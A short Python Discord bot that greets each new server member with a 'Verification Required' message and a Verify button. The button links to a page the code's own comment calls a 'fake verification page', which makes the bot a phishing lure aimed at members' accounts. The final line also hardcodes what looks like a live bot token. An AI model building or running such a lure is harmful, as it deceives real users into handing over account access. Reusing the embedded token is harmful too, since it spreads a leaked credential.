import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True  # IMPORTANT

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot online as {bot.user}")

@bot.event
async def on_member_join(member):
    channel = discord.utils.get(member.guild.text_channels, name="verify-here")
    if not channel:
        print("Channel #verify-here not found.")
        return

    class VerifyView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)
            self.add_item(discord.ui.Button(
                label="Verify",
                url="https://your-verification-page.com"  # <-- your fake verification page
            ))

    await channel.send(
        "⚠️ **Verification Required**\n"
        "Please click the button below to complete verification.",
        view=VerifyView()
    )

bot.run("MTQzOTk2NTM2NDY2NTU4NTc4NA.GwevAJ.F8uy1BmlCbs3aJMHqWmohf2P9TP6QJWSwBInv0")
